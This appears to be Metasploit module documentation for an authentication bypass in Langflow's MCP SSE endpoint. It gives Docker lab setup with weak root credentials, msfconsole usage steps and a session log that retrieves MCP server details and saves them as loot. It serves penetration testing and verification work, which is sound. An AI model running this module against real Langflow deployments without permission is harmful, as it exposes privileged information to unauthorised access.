## Vulnerable Application

Langflow versions 1.5.0 through 1.11.4 allow unauthenticated
connections to the MCP SSE endpoint, allowing attackers to initialize
MCP sessions and retrieve privileged MCP-related information.

The MCP information collected from this module is stored in Metasploit
loot as a JSON document.

The vulnerability affects:

    * Langflow versions 1.5.0 through 1.11.4


This module was successfully tested on:

    * Langflow 1.8.4 installed with Docker


### Installation
1. Install your favorite virtualization engine (VirtualBox or VMware) on your preferred platform.
2. Install Ubuntu Linux (or other Linux distro) in your virtualization engine.
3. Pull pre-built Langflow docker container (v1.8.4) in your VM.
   `docker pull langflowai/langflow:1.8.4`
4. Start the langflow container.


```
sudo docker run -d \
  --name langflow \
  -p 192.168.1.30:7860:7860 \
  -e LANGFLOW_SUPERUSER=root \
  -e LANGFLOW_SUPERUSER_PASSWORD=root \
  -e LANGFLOW_AUTO_LOGIN=true \
  langflowai/langflow:1.8.4
```

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/gather/langflow_auth_bypass_cve_2026_93680`
4. Do: `run rhosts=<rhost>`


## Options


## Scenarios
```
msf > use auxiliary/gather/langflow_auth_bypass_cve_2026_93680
msf auxiliary(gather/langflow_auth_bypass_cve_2026_93680) > set RHOSTS 192.168.1.30
RHOSTS => 192.168.1.30
msf auxiliary(gather/langflow_auth_bypass_cve_2026_93680) > run
[*] Running module against 192.168.1.30
[*] Connecting to Langflow MCP SSE endpoint...
[+] Connected to MCP SSE endpoint
[+] MCP session ID: 8feeae857065419286b4c660b4365087
[*] Initializing MCP session...
[+] MCP initialize accepted (HTTP 202)
[+] MCP server: langflow-mcp-server 1.26.0
[+] MCP protocol version: 2025-06-18
[*] MCP capabilities: experimental, prompts, resources, tools
[*] Sending MCP initialized notification...
[+] MCP initialized notification accepted (HTTP 202)
[*] Requesting MCP tool list...
[+] MCP tools/list accepted (HTTP 202)
[+] MCP tools discovered: 0
[+] Langflow MCP information stored in loot: /home/richard/.msf4/loot/20260922190520_default_192.168.1.30_langflow.mcp_687358.json
[*] Auxiliary module execution completed
msf auxiliary(gather/langflow_auth_bypass_cve_2026_93680) > 
```
